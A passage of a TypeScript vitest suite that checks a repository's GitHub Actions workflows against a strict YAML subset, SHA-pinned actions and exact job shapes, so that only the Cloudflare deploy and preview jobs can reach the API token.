import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, expect, test } from 'vitest';

const root = (path: string) => fileURLToPath(new URL(`../../${path}`, import.meta.url));
// As the bytes are: a CR is refused below, not normalised away (.gitattributes checks workflows out as LF).
const read = (path: string) => readFileSync(root(path), 'utf8');

// GitHub runs every .yml and .yaml file in .github/workflows/, so every one is held to these rules.
const WORKFLOWS = new Map(
  readdirSync(root('.github/workflows'))
    .filter((name) => /\.ya?ml$/.test(name))
    .map((name) => [name, read(`.github/workflows/${name}`)]),
);

// ---------------------------------------------------------------------------------------------
// The canonical subset. There is no YAML parser among the dependencies, so every workflow must be
// written in a subset of block YAML that the line-based reading below sees exactly as GitHub does.
// A workflow holds only printable ASCII and LF, everywhere, comments and block scalars included:
// YAML also breaks lines at CR, NEL, LS and PS, and a split on LF would never see a line one of
// them starts. Indentation is spaces. Outside block scalars (the lines under a `key: |` or
// `key: >-` header), a line is blank, a comment, `key:` or `key: value` with a bare key, or `- `
// followed by one of those or by a value. Each nested block sits exactly two spaces under its key,
// and no mapping repeats a key. A value may not be a tag (!), anchor (&), alias (*), flow
// collection ({ or [) or complex key (?); a quoted value closes on its own line; and a
// double-quoted value holds no backslash, whose escapes could spell anything, `secrets` included.
// The keys that hold a mapping (env, with, ...) hold it on the lines below, never as one value
// (an expression, or `inherit`) whose entries no line-based check could see.
// ---------------------------------------------------------------------------------------------

const KEY = /^([A-Za-z_][\w-]*):(?: (.*))?$/;
const BLOCK_SCALAR = /^[|>][-+]?$/;
const OUTSIDE_ASCII = /[^\x20-\x7E]/;
const CHARACTER_NAMES: Record<string, string> = {
  '\t': 'tab',
  '\r': 'CR',
  '\u0085': 'NEL',
  '\u00A0': 'NBSP',
  '\u2028': 'LS',
  '\u2029': 'PS',
  '\uFEFF': 'BOM',
};
const MAPPING_ONLY = new Set(['env', 'with', 'secrets', 'outputs', 'services', 'container', 'strategy', 'defaults', 'inputs', 'permissions']);
/** The leading ASCII spaces: a tab, an NBSP or any other whitespace is not indentation. */
const indentOf = (line: string) => /^ */.exec(line)![0].length;
/** `U+000D (CR)`: a character by its code point, and by name if it's one of the usual suspects. */
function codePoint(c: string): string {
  const name = CHARACTER_NAMES[c];
  return `U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}${name ? ` (${name})` : ''}`;
}
/** A line as printable ASCII, with every other character written as `<U+000D (CR)>`. */
const visible = (line: string) => line.replace(/[^\x20-\x7E]/gu, (c) => `<${codePoint(c)}>`);

/** What is wrong with a value after `key: ` or `- `, if anything. */
function valueError(value: string): string | undefined {
  if (BLOCK_SCALAR.test(value)) return undefined;
  if (/^\s/.test(value)) return 'more than one space before a value';
  if (/^[!&*{[?%@`|>#,]/.test(value)) return 'a tag, anchor, alias, flow collection, complex key, directive or comment in place of a value';
  if (/^-(?: |$)/.test(value)) return 'a sequence in place of a value';
  if (value.startsWith('"') && !/^"[^"\\]*"(?: +#.*)?$/.test(value)) return 'a double-quoted value with a backslash, or one that does not close on its line';
  if (value.startsWith("'") && !/^'(?:[^']|'')*'(?: +#.*)?$/.test(value)) return 'a single-quoted value that does not close on its line';
  return undefined;
}

/** Reads a workflow as the canonical subset: the lines outside it, and which lines are YAML comments. */
function readCanonical(file: string, text: string): { errors: string[]; comments: Set<number> } {
  const errors: string[] = [];
  const comments = new Set<number>();
  // The open blocks: each sequence or mapping, at its indentation, with the keys it has seen.
  const levels: { indent: number; sequence: boolean; keys: Set<string> }[] = [];
  let parent: number | undefined; // the column of a `key:` whose nested block may come next
  let scalarParent = -1; // the column of the key, or dash, whose block scalar this is
  text.split('\n').forEach((line, i) => {
    const fail = (why: string) => {
      errors.push(`${file}:${i + 1}: ${why}: ${visible(line).trim()}`);
    };
    // First, before blank lines, comments or block scalars are set aside: this holds everywhere.
    const odd = OUTSIDE_ASCII.exec(line);
    if (odd) return fail(`column ${odd.index + 1} is ${codePoint(odd[0])}, but a workflow holds only printable ASCII and LF`);
    if (/^ *$/.test(line)) return;
    const indent = indentOf(line);
    if (scalarParent >= 0 && indent > scalarParent) return;
    scalarParent = -1;
    if (line.slice(indent).startsWith('#')) return void comments.add(i);
    const item = line.slice(indent).startsWith('- ');
    if (parent !== undefined && indent > parent) {
      if (indent !== parent + 2) fail('a nested block not indented two spaces under its key');
      levels.push({ indent, sequence: item, keys: new Set() });
    } else {
      while (levels.length > 0 && levels.at(-1)!.indent > indent) levels.pop();
      if (levels.length === 0 && indent === 0) levels.push({ indent, sequence: item, keys: new Set() });
      if (levels.at(-1)?.indent !== indent) return fail('an indentation that matches no open block');
    }
    parent = undefined;
    const level = levels.at(-1)!;
    if (level.sequence !== item) return fail(item ? 'a sequence item among keys' : 'a key among sequence items');
    let node = line.slice(indent);
    let column = indent;
    let keys = level.keys;
    if (item) {
      node = node.slice(2);
      column += 2;
      if (!KEY.test(node)) {
        const why = /^-(?: |$)/.test(node) ? 'a nested sequence' : valueError(node);
        if (why) return fail(why);
        if (BLOCK_SCALAR.test(node)) scalarParent = indent;
        return;
      }
      const mapping = { indent: column, sequence: false, keys: new Set<string>() };
      levels.push(mapping);
      keys = mapping.keys;
    }
    const [, key, value] = KEY.exec(node) ?? [];
    if (key === undefined) return fail('not a bare `key:` or `key: value`');
    if (keys.has(key)) return fail(`a second "${key}" in one mapping`);
    keys.add(key);
    if (value === undefined) {
      parent = column;
      return;
    }
    const why = valueError(value);
    if (why) return fail(why);
    if (BLOCK_SCALAR.test(value)) scalarParent = column;
    if (MAPPING_ONLY.has(key)) fail(`"${key}" must be a mapping on the lines below, not a value on its own line`);
  });
  return { errors, comments };
}

const CANONICAL = new Map([...WORKFLOWS].map(([file, text]) => [file, readCanonical(file, text)]));

/** A workflow's lines without its YAML comments. Block-scalar lines stay, `#` or not: GitHub reads them. */
const codeOf = (text: string, comments: Set<number>) => text.split('\n').filter((_line, i) => !comments.has(i));
const code = (file: string) => codeOf(WORKFLOWS.get(file)!, CANONICAL.get(file)!.comments);
/** The non-blank lines under `jobs:`. */
const jobLinesOf = (lines: string[]) => lines.slice(lines.indexOf('jobs:') + 1).filter((line) => line.trim() !== '');
const jobLines = (file: string) => jobLinesOf(code(file));
const JOB_KEY = /^ {2}[\w-]+:$/;

/** A workflow's jobs by name, each the text of its block, split on the two-space job keys. `text` is for the self-tests. */
function jobBlocks(file: string, text = WORKFLOWS.get(file)!): Map<string, string> {
  const canonical = readCanonical(file, text);
  const lines = jobLinesOf(codeOf(text, canonical.comments));
  const starts = lines.flatMap((line, i) => (JOB_KEY.test(line) ? [i] : []));
  if (starts.length === 0) {
    // A file outside the subset (CRLF line endings, say) can hide every job: say why first.
    const why = canonical.errors.slice(0, 3);
    throw new Error(`found no jobs in ${file}: has its layout changed?${why.length > 0 ? `\n${why.join('\n')}` : ''}`);
  }
  return new Map(starts.map((start, i) => [lines[start]!.trim().slice(0, -1), lines.slice(start, starts[i + 1]).join('\n')]));
}

const JOBS = new Map<string, string>(
  [...WORKFLOWS.keys()].flatMap((file) => [...jobBlocks(file)].map(([name, block]) => [`${file}:${name}`, block] as [string, string])),
);
const job = (name: string) => JOBS.get(name) ?? '';

/** A job's steps: its `steps:` block, split on the six-space `- ` that starts each one. */
function steps(block: string): string[] {
  const lines = block.split('\n');
  const at = lines.indexOf('    steps:');
  if (at === -1) return [];
  const body = lines.slice(at + 1);
  const end = body.findIndex((line) => !line.startsWith('      '));
  return (end === -1 ? body : body.slice(0, end)).join('\n').split(/^ {6}- /m).slice(1);
}
/** A step's own scalar key (`uses`, `id`, `if`, `run`): on the step's first line, or at eight spaces. */
const stepValue = (step: string, key: string) => new RegExp(`^(?: {8})?${key}: (.*)$`, 'm').exec(step)?.[1];
/** The keys and values of a mapping (`with`, `env`, `outputs`) that sits `indent` spaces deep, one level down. */
function mapping(text: string, key: string, indent: number): Map<string, string> {
  const lines = text.split('\n');
  const at = lines.findIndex((line) => line === `${' '.repeat(indent)}${key}:` || (indent === 8 && line === `${key}:`));
  const out = new Map<string, string>();
  if (at === -1) return out;
  for (const line of lines.slice(at + 1)) {
    if (indentOf(line) <= indent) break;
    const entry = new RegExp(`^ {${indent + 2}}([\\w-]+):(?: (.*))?$`).exec(line);
    if (entry) out.set(entry[1]!, entry[2] ?? '');
  }
  return out;
}
/** A block scalar's lines (`run: |`, `sparse-checkout: |`), dedented; or the plain value. */
function scalar(step: string, key: string, indent: number): string | undefined {
  const lines = step.split('\n');
  const at = lines.findIndex((line) => new RegExp(`^(?: {${indent}})?${key}:`).test(line));
  if (at === -1) return undefined;
  const value = lines[at]!.replace(new RegExp(`^(?: {${indent}})?${key}:\\s*`), '');
  if (!/^[|>]/.test(value)) return value;
  const body: string[] = [];
  for (const line of lines.slice(at + 1)) {
    if (!line.startsWith(' '.repeat(indent + 2))) break;
    body.push(line.slice(indent + 2));
  }
  return body.join('\n');
}
/** A job's needs, as a scalar or a block sequence. */
function needs(block: string): string[] {
  const one = /^ {4}needs: (\S+)$/m.exec(block);
  if (one) return [one[1]!];
  const lines = block.split('\n');
  const at = lines.indexOf('    needs:');
  if (at === -1) return [];
  const out: string[] = [];
  for (const line of lines.slice(at + 1)) {
    const entry = /^ {6}- ([\w-]+)$/.exec(line);
    if (!entry) break;
    out.push(entry[1]!);
  }
  return out;
}
/** A job's own `if:`, folded or not. */
const condition = (block: string) => /^ {4}if:([\s\S]*?)^ {4}\w/m.exec(block)?.[1] ?? '';
/** A step's action, without its pin: `actions/checkout`. */
const action = (step: string) => stepValue(step, 'uses')?.split('@')[0];

// A job holds the Cloudflare token if it names secrets at all, in any form (secrets.X,
// secrets['X'], toJSON(secrets), secrets: inherit), other than the GITHUB_TOKEN every job has.
// The canonical subset keeps a reference from hiding behind a YAML escape.
const holdsSecrets = (text: string) => /\bsecrets\b(?!\.GITHUB_TOKEN\b)/i.test(text);

const COOLDOWN_DAYS = [...read('.github/dependabot.yml').matchAll(/default-days: (\d+)/g)].map((match) => match[1]);
const PIN = /^(actions\/[\w-]+|cloudflare\/wrangler-action)@[0-9a-f]{40} # v\d+\.\d+\.\d+$/;
const TOP_LEVEL_KEYS = ['name', 'run-name', 'on', 'permissions', 'concurrency', 'jobs'];
const RUNNER = "${{ vars.CI_LINUX_RUNNER || 'ubuntu-latest' }}";
// verify on a push to main builds the artifact that deploys, so it too runs on a GitHub-hosted runner.
const VERIFY_RUNNER = "${{ github.event_name == 'push' && 'ubuntu-latest' || vars.CI_LINUX_RUNNER || 'ubuntu-latest' }}";
const ENABLED = "env.HAS_CLOUDFLARE == 'true'";
const TRUSTED_FILES = ['/.nvmrc', '/package.json', '/scripts/trusted-config.mjs', '/wrangler.jsonc'];
const SITE = '${{ runner.temp }}/site';
const TRUSTED_CONFIG = 'node trusted/scripts/trusted-config.mjs trusted';
const VERSION_CHECK = 'test -n "$WRANGLER_VERSION" || { echo "::error::trusted-config.mjs gave no wrangler version"; exit 1; }';
// npm 11.10.0 added min-release-age; an older npm only warns about it, and installs with no floor.
// No `npm config get` output tells a working npm 11.16+ from npm 10, so the check reads the version.
const FLOOR_CHECK = [
  "node -e '",
  '  const version = process.argv[1];',
  '  const parts = /^(\\d+)\\.(\\d+)\\.(\\d+)$/.exec(version);',
  '  const [major, minor] = parts ? [Number(parts[1]), Number(parts[2])] : [NaN, NaN];',
  '  if (!(major > 11 || (major === 11 && minor >= 10))) {',
  '    console.log(`::error::npm ${version || "(no version)"} predates min-release-age (npm 11.10.0), so it would install with no floor`);',
  '    process.exit(1);',
  '  }',
  '  console.log(`npm ${version} applies min-release-age`);',
  `' "$(npm --version)"`,
].join('\n');
const COPY_SITE = [
  'mkdir -p "$RUNNER_TEMP/site/bundle"',
  'cp -R "$RUNNER_TEMP/artifact/dist" "$RUNNER_TEMP/site/dist"',
  'cp "$RUNNER_TEMP/artifact/bundle/worker.js" "$RUNNER_TEMP/site/bundle/worker.js"',
  'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"',
].join('\n');
const COPY_CONFIG = ['mkdir -p "$RUNNER_TEMP/site"', 'cp trusted/wrangler.jsonc "$RUNNER_TEMP/site/wrangler.jsonc"'].join('\n');
// An empty artifact-ids makes download-artifact take every artifact in the run, so the ID must be
// one number: non-empty, with nothing left once its digits are removed.
const ID_CHECK =
  'test -n "$ARTIFACT_ID" && test -z "${ARTIFACT_ID//[0123456789]/}" || { echo "::error::the artifact ID is empty or not a number, and an empty one would download every artifact in the run"; exit 1; }';
// download-artifact v8 is the first to fail on a digest mismatch by default (digest-mismatch: error).
const DOWNLOAD_MAJOR = 8;
const NOTICE = /^echo "::notice title=\w+ skipped::[^"$`\\]*"$/;
// What each action may be given in a job that holds the token: a preCommands or a mirror would run
// or fetch something the trusted ref did not choose, and a download by name could take a
// replacement artifact.
const INPUTS: Record<string, string[]> = {
  'actions/checkout': ['ref', 'path', 'sparse-checkout', 'sparse-checkout-cone-mode', 'persist-credentials'],
  'actions/setup-node': ['node-version-file', 'package-manager-cache'],
  'actions/download-artifact': ['artifact-ids', 'path'],
  'actions/github-script': ['script'],
  'cloudflare/wrangler-action': ['apiToken', 'accountId', 'wranglerVersion', 'workingDirectory', 'command'],
};
const STEP_ENV = ['WRANGLER_VERSION', 'ARTIFACT_ID', 'PREVIEW_URL', 'npm_config_ignore_scripts', 'npm_config_min_release_age'];
const ARTIFACT_ID = '${{ steps.upload.outputs.artifact-id }}';

// The jobs that hold the token: the environment each runs through, the ref it trusts, the job whose
// artifact it deploys, and its one wrangler command.
const TOKEN_JOBS = {
  'ci.yml:deploy': {
    environment: 'production',
    ref: '${{ github.sha }}',
    builder: 'verify',
    command: 'deploy bundle/worker.js --no-bundle --config wrangler.jsonc',
  },
  'ci.yml:preview': {
    environment: 'preview',
    ref: 'refs/heads/${{ github.event.repository.default_branch }}',
    builder: 'preview-build',
    command: 'preview bundle/worker.js --name pr-${{ github.event.pull_request.number }} --config wrangler.jsonc',
  },
  'ci.yml:preview-cleanup': {
    environment: 'preview',
    ref: 'refs/heads/${{ github.event.repository.default_branch }}',
    builder: undefined,
    command: 'preview delete --name pr-${{ github.event.pull_request.number }} --config wrangler.jsonc',
  },
};

// ---------------------------------------------------------------------------------------------
// The pin (Ruling 77). Each token job is exactly the job below: its keys, from an allow-list; its
// steps, in order, each by its action at its SHA or its exact script; every `if`, `id`, `with`
// and `env` value as written; and step keys from an allow-list. Only the names are free. So any
// change to a token job, a Dependabot bump of one of its actions included, changes this pin too,
// after review. `secrets` appears only on the HAS_CLOUDFLARE line and in wrangler-action's
// apiToken and accountId.
// ---------------------------------------------------------------------------------------------

/** A value in the canonical subset: a scalar as written (a block scalar as its header and dedented lines), a sequence or a mapping. */
type Yaml = string | Yaml[] | { [key: string]: Yaml };
const isMapping = (value: Yaml | undefined): value is { [key: string]: Yaml } => typeof value === 'object' && !Array.isArray(value);

const TOKEN_ACTIONS = {
  checkout: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
  setupNode: 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1',
  download: 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c',
  githubScript: 'actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3',
  wrangler: 'cloudflare/wrangler-action@953926a2e2182532811c01a25e53647d93bf07c0',
};
const TOKEN_JOB_KEYS = ['name', 'if', 'needs', 'runs-on', 'environment', 'permissions', 'env', 'steps'];
const TOKEN_STEP_KEYS = ['name', 'id', 'if', 'uses', 'with', 'env', 'run'];
const HAS_CLOUDFLARE = "${{ secrets.CLOUDFLARE_API_TOKEN != '' }}";
const WRANGLER_VERSION_OUTPUT = '${{ steps.trusted.outputs.wrangler-version }}';
const literal = (text: string) => `|\n${text}`;
const folded = (...lines: string[]) => ['>-', ...lines].join('\n');
const previewGate = (action: string) =>
  folded(
    "vars.CI_PREVIEWS == 'true' &&",
    `github.event_name == 'pull_request' && github.event.action ${action} &&`,
    'github.event.pull_request.head.repo.full_name == github.repository &&',
    'github.event.pull_request.base.ref == github.event.repository.default_branch',
  );
const notice = (title: string, text: string) => ({ if: "env.HAS_CLOUDFLARE != 'true'", run: `echo "::notice title=${title} skipped::${text}"` });
const enabled = (step: { [key: string]: Yaml }) => ({ if: ENABLED, ...step });
const trustedSteps = (ref: string) => [
  enabled({
    uses: TOKEN_ACTIONS.checkout,
    with: { ref, path: 'trusted', 'sparse-checkout': literal(TRUSTED_FILES.join('\n')), 'sparse-checkout-cone-mode': 'false', 'persist-credentials': 'false' },
  }),
  enabled({ uses: TOKEN_ACTIONS.setupNode, with: { 'node-version-file': 'trusted/.nvmrc', 'package-manager-cache': 'false' } }),
  enabled({ id: 'trusted', run: TRUSTED_CONFIG }),
  enabled({ env: { WRANGLER_VERSION: WRANGLER_VERSION_OUTPUT }, run: VERSION_CHECK }),
  enabled({ run: literal(FLOOR_CHECK) }),
];
const siteSteps = (builder: string) => {
  const id = `\${{ needs.${builder}.outputs.site-artifact-id }}`;
  return [
    enabled({ env: { ARTIFACT_ID: id }, run: ID_CHECK }),
    enabled({ uses: TOKEN_ACTIONS.download, with: { 'artifact-ids': id, path: '${{ runner.temp }}/artifact' } }),
    enabled({ run: literal(COPY_SITE) }),
  ];
};
const wranglerStep = (command: string, id?: string) =>
  enabled({
    ...(id ? { id } : {}),
    uses: TOKEN_ACTIONS.wrangler,
    env: { npm_config_ignore_scripts: "'true'", npm_config_min_release_age: `'${COOLDOWN_DAYS[0]}'` },
    with: {
      apiToken: '${{ secrets.CLOUDFLARE_API_TOKEN }}',
      accountId: '${{ secrets.CLOUDFLARE_ACCOUNT_ID }}',
      wranglerVersion: WRANGLER_VERSION_OUTPUT,
      workingDirectory: SITE,
      command,
    },
  });
const PREVIEW_COMMENT = [
  "const marker = '<!-- cloudflare-site-template:preview -->';",
  'const sha = context.payload.pull_request.head.sha.slice(0, 7);',
  'const body = [',
  '  marker,',
  '  `**Preview:** ${process.env.PREVIEW_URL}`,',
  "  '',",
  "  `Built from ${sha} with Turnstile's test keys and \\`log\\` delivery: the form works and sends nothing.`,",
  "].join('\\n');",
  'const { owner, repo } = context.repo;',
  'const issue_number = context.payload.pull_request.number;',
  'const comments = await github.paginate(github.rest.issues.listComments, { owner, repo, issue_number });',
  "const mine = comments.find((comment) => comment.user?.type === 'Bot' && comment.body?.startsWith(marker));",
  'if (mine) await github.rest.issues.updateComment({ owner, repo, comment_id: mine.id, body });',
  'else await github.rest.issues.createComment({ owner, repo, issue_number, body });',
].join('\n');
const SECRETS_IN = 'CLOUDFLARE_API_TOKEN and CLOUDFLARE_ACCOUNT_ID secrets in the';

const TOKEN_JOB_SHAPES: Record<keyof typeof TOKEN_JOBS, { [key: string]: Yaml }> = {
  'ci.yml:deploy': {
    if: "github.event_name == 'push' && github.ref == 'refs/heads/main'",
    needs: ['verify', 'e2e'],
    'runs-on': 'ubuntu-latest',
    environment: 'production',
    env: { HAS_CLOUDFLARE },
    steps: [
      notice('Deploy', `Set the ${SECRETS_IN} production environment (or as repository secrets, on a private GitHub Free repository) to deploy from CI.`),
      ...trustedSteps(TOKEN_JOBS['ci.yml:deploy'].ref),
      ...siteSteps('verify'),
      wranglerStep(TOKEN_JOBS['ci.yml:deploy'].command),
    ],
  },
  'ci.yml:preview': {
    if: previewGate("!= 'closed'"),
    needs: 'preview-build',
    'runs-on': 'ubuntu-latest',
    environment: 'preview',
    permissions: { contents: 'read', 'pull-requests': 'write' },
    env: { HAS_CLOUDFLARE },
    steps: [
      notice('Preview', `Set the ${SECRETS_IN} preview environment, behind required reviewers, to get a preview per pull request. Repository secrets reach this job too, unreviewed.`),
      ...trustedSteps(TOKEN_JOBS['ci.yml:preview'].ref),
      ...siteSteps('preview-build'),
      wranglerStep(TOKEN_JOBS['ci.yml:preview'].command, 'preview'),
      enabled({ uses: TOKEN_ACTIONS.githubScript, env: { PREVIEW_URL: '${{ steps.preview.outputs.preview-url }}' }, with: { script: literal(PREVIEW_COMMENT) } }),
    ],
  },
  'ci.yml:preview-cleanup': {
    if: previewGate("== 'closed'"),
    'runs-on': 'ubuntu-latest',
    environment: 'preview',
    env: { HAS_CLOUDFLARE },
    steps: [...trustedSteps(TOKEN_JOBS['ci.yml:preview-cleanup'].ref), enabled({ run: literal(COPY_CONFIG) }), wranglerStep(TOKEN_JOBS['ci.yml:preview-cleanup'].command)],
  },
};

/**
 * Reads lines in the canonical subset, without comments or blank lines, into values: a plain
 * scalar without its comment, a quoted one as written, a block scalar as its header line and its
 * lines dedented. Mappings have no prototype, so no key (`__proto__` included) can hide. `rest` is
 * whatever it could not place.
 */
function readYaml(input: string[]): { value: Yaml; rest: string[] } {
  const lines = [...input];
  let i = 0;
  const scalar = (raw: string, column: number): Yaml => {
    if (raw === '') return node(column + 2);
    if (BLOCK_SCALAR.test(raw)) {
      const body: string[] = [];
      while (i < lines.length && indentOf(lines[i]!) > column) body.push(lines[i++]!);
      const by = body.length > 0 ? indentOf(body[0]!) : 0;
      return [raw, ...body.map((line) => line.slice(by))].join('\n');
    }
    return /^(?:'(?:[^']|'')*'|"[^"]*")/.exec(raw)?.[0] ?? raw.replace(/ +#.*$/, '');
  };
  const node = (indent: number): Yaml => {
    if (i >= lines.length || indentOf(lines[i]!) !== indent) return '';
    if (lines[i]!.startsWith('- ', indent)) {
      const items: Yaml[] = [];
      while (i < lines.length && indentOf(lines[i]!) === indent && lines[i]!.startsWith('- ', indent)) {
        const item = lines[i]!.slice(indent + 2);
        if (KEY.test(item)) {
          // `- key: value` opens a mapping two columns in: read it there.
          lines[i] = `${' '.repeat(indent + 2)}${item}`;
          items.push(node(indent + 2));
        } else {
          i++;
          items.push(scalar(item, indent));
        }
      }
      return items;
    }
    const map: { [key: string]: Yaml } = Object.create(null);
    while (i < lines.length && indentOf(lines[i]!) === indent) {
      const entry = KEY.exec(lines[i]!.slice(indent));
      if (!entry) break;
      i++;
      map[entry[1]!] = scalar(entry[2] ?? '', indent);
    }
    return map;
  };
  const value = node(lines.length > 0 ? indentOf(lines[0]!) : 0);
  return { value, rest: lines.slice(i) };
}

/** JSON with every mapping's keys sorted, so two values compare as text. */
const stable = (value: Yaml | undefined) =>
  JSON.stringify(value, (_key, inner: unknown) =>
    inner && typeof inner === 'object' && !Array.isArray(inner) ? Object.fromEntries(Object.entries(inner).sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0))) : inner,
  ) ?? '(none)';
const unnamed = (value: Yaml | undefined) => (isMapping(value) ? Object.fromEntries(Object.entries(value).filter(([key]) => key !== 'name')) : value);
/** `step 3: with.apiToken`, or `env.HAS_CLOUDFLARE`: a place in a job, steps counted from one as GitHub shows them. */
const place = (path: string[]) => (path[0] === 'steps' && path.length > 1 ? `step ${Number(path[1]) + 1}: ${path.slice(2).join('.')}` : path.join('.'));
/**
 * Where a job names secrets, in any form, by place: every key that does, and every scalar that does
 * in an expression, which starts at its first `${{`, or is the whole of an `if`. The skip notices
 * say "secrets" in prose, outside any expression.
 */
function secretPlaces(value: Yaml, path: string[] = []): string[] {
  if (typeof value === 'string') {
    const at = value.indexOf('${{');
    const expression = path.at(-1) === 'if' ? value : at === -1 ? '' : value.slice(at);
    return /\bsecrets\b/i.test(expression) ? [place(path)] : [];
  }
  const entries = Array.isArray(value) ? value.map((item, i) => [String(i), item] as const) : Object.entries(value);
  return entries.flatMap(([key, inner]) => [...(/\bsecrets\b/i.test(key) ? [place([...path, key])] : []), ...secretPlaces(inner, [...path, key])]);
}

/** What makes a token job other than its pin: unknown keys, `secrets` out of place, and any other difference. */
function tokenJobProblems(name: keyof typeof TOKEN_JOBS, block: string): { keys: string[]; secrets: string[]; shape: string[] } {
  const pinned = TOKEN_JOB_SHAPES[name];
  const { value, rest } = readYaml(block.split('\n').slice(1));
  const job = isMapping(value) ? value : {};
  const steps = Array.isArray(job.steps) ? job.steps : [];
  const pinnedSteps = pinned.steps as Yaml[];

  const keys = [
    ...Object.keys(job).flatMap((key) => (TOKEN_JOB_KEYS.includes(key) ? [] : [`job key "${key}" is not one a token job may have`])),
    ...steps.flatMap((step, i) =>
      Object.keys(isMapping(step) ? step : {}).flatMap((key) => (TOKEN_STEP_KEYS.includes(key) ? [] : [`step ${i + 1}: "${key}" is not a key a token job's step may have`])),
    ),
  ];

  // The reader places every line, or the shape check below says so, so this sees every key and value.
  const wrangler = steps.findIndex((step) => isMapping(step) && step.uses === TOKEN_ACTIONS.wrangler);
  const allowed = ['env.HAS_CLOUDFLARE', ...(wrangler === -1 ? [] : ['apiToken', 'accountId'].map((input) => `step ${wrangler + 1}: with.${input}`))];
  const secrets = secretPlaces(job).flatMap((at) => (allowed.includes(at) ? [] : [`${at} names secrets`]));

  const shape = [
    ...(rest.length > 0 ? [`lines the pin cannot place, from: ${rest[0]!.trim()}`] : []),
    ...Object.keys({ ...job, ...pinned })
      .filter((key) => key !== 'name' && key !== 'steps' && stable(job[key]) !== stable(pinned[key]))
      .map((key) => `job ${key}: ${stable(job[key])}, but the pin is ${stable(pinned[key])}`),
    ...(steps.length === pinnedSteps.length ? [] : [`${steps.length} steps, but the pin has ${pinnedSteps.length}`]),
    ...Array.from({ length: Math.max(steps.length, pinnedSteps.length) }, (_, i) => {
      const [actual, want] = [unnamed(steps[i]), pinnedSteps[i]];
      if (stable(actual) === stable(want)) return [];
      // A Dependabot bump moves an action's SHA: name it, so the pin moves with it once the new commit is checked.
      const [uses, pin] = [isMapping(actual) ? actual.uses : undefined, isMapping(want) ? want.uses : undefined];
      const bumped = typeof uses === 'string' && typeof pin === 'string' && uses !== pin && uses.split('@')[0] === pin.split('@')[0];
      return [`step ${i + 1}: ${stable(actual)}, but the pin is ${stable(want)}${bumped ? ` (a new SHA for ${pin.split('@')[0]}: check that commit, then move TOKEN_ACTIONS)` : ''}`];
    }).flat(),
  ];
  return { keys, secrets, shape };
}

describe.each([...WORKFLOWS.keys()])('%s', (file) => {
  test('is written in the canonical block-YAML subset', () => {
    expect(CANONICAL.get(file)!.errors).toEqual([]);
  });

  // A workflow-level env reaches every job, the token jobs among them, and none of the job checks below.
  test('has only the expected top-level keys, and names no secrets before jobs:', () => {
    const lines = code(file);
    const top = lines.slice(0, lines.indexOf('jobs:'));
    for (const line of lines.filter((line) => /^\S/.test(line))) expect(TOP_LEVEL_KEYS, line).toContain(line.split(':')[0]);
    expect(holdsSecrets(top.join('\n'))).toBe(false);
  });

  test('has only two-space job keys under jobs:, and nothing after them at the top level', () => {
    for (const line of jobLines(file)) {
      expect(line, `${file}: ${line}`).toMatch(/^ {2}/);
      if (/^ {2}\S/.test(line)) expect(line, `${file}: ${line}`).toMatch(JOB_KEY);
    }
  });
});

test('the splitter finds every job in ci.yml', () => {
  expect([...JOBS.keys()].filter((name) => name.startsWith('ci.yml:')).sort()).toEqual(
    ['deploy', 'e2e', 'preview', 'preview-build', 'preview-cleanup', 'verify'].map((name) => `ci.yml:${name}`),
  );
});

test('only the deploy and preview jobs can read a secret', () => {
  const holders = [...JOBS].filter(([, block]) => holdsSecrets(block)).map(([name]) => name);
  expect(holders.sort()).toEqual(Object.keys(TOKEN_JOBS).sort());
});

test('the jobs without the token, but verify, run where CI_LINUX_RUNNER says', () => {
  for (const [name, block] of JOBS) if (!holdsSecrets(block) && name !== 'ci.yml:verify') expect(block, name).toContain(`\n    runs-on: ${RUNNER}\n`);
});

test('verify runs on a GitHub-hosted runner, with no npm cache, whenever it uploads the artifact that deploys', () => {
  expect(job('ci.yml:verify')).toContain(`\n    runs-on: ${VERIFY_RUNNER}\n`);
  const uploads = steps(job('ci.yml:verify')).filter((step) => action(step) === 'actions/upload-artifact');
  expect(uploads).toHaveLength(1);
  // the runner expression picks ubuntu-latest for every push; the upload needs a push.
  expect(stepValue(uploads[0]!, 'if')).toBe("github.event_name == 'push' && github.ref == 'refs/heads/main'");
  // e2e on main runs on the self-hosted runner, and could save an npm cache there.
  const setupNode = steps(job('ci.yml:verify')).filter((step) => action(step) === 'actions/setup-node');
  expect(setupNode).toHaveLength(1);
  expect(mapping(setupNode[0]!, 'with', 8).get('cache')).toBe("${{ github.event_name != 'push' && 'npm' || '' }}");
  expect(mapping(setupNode[0]!, 'with', 8).get('package-manager-cache')).toBe('false');
});

test.each([
  ['ci.yml:verify', 'dist/\nbundle/'],
  ['ci.yml:preview-build', 'dist/\nbundle/'],
  ['ci.yml:e2e', 'test-results/\n.lighthouse/'],
])('%s uploads its files, hidden ones included', (name, paths) => {
  const uploads = steps(job(name)).filter((step) => action(step) === 'actions/upload-artifact');
  expect(uploads).toHaveLength(1);
  expect(mapping(uploads[0]!, 'with', 8).get('include-hidden-files')).toBe('true');
  expect(scalar(uploads[0]!, 'path', 10)).toBe(paths);
});

test.each(['ci.yml:verify', 'ci.yml:preview-build'])("%s hands on its upload's artifact ID as a job output", (name) => {
  const uploads = steps(job(name)).filter((step) => action(step) === 'actions/upload-artifact');
  expect(stepValue(uploads[0]!, 'id')).toBe('upload');
  expect([...mapping(job(name), 'outputs', 4)]).toEqual([['site-artifact-id', ARTIFACT_ID]]);
});

describe.each(Object.entries(TOKEN_JOBS))('the %s job, which holds the token', (name, expected) => {
  const block = job(name);
  const all = steps(block);
  const find = (actionName: string) => all.filter((step) => action(step) === actionName);
  const runs = all.flatMap((step) => {
    const script = scalar(step, 'run', 8);
    return script === undefined ? [] : [script];
  });
  const at = (predicate: (step: string) => boolean) => all.findIndex(predicate);
  const wranglers = find('cloudflare/wrangler-action');
  const problems = tokenJobProblems(name as keyof typeof TOKEN_JOBS, block);

  test(`runs through the ${expected.environment} environment, on a GitHub-hosted runner`, () => {
    expect(block).toContain(`\n    environment: ${expected.environment}\n`);
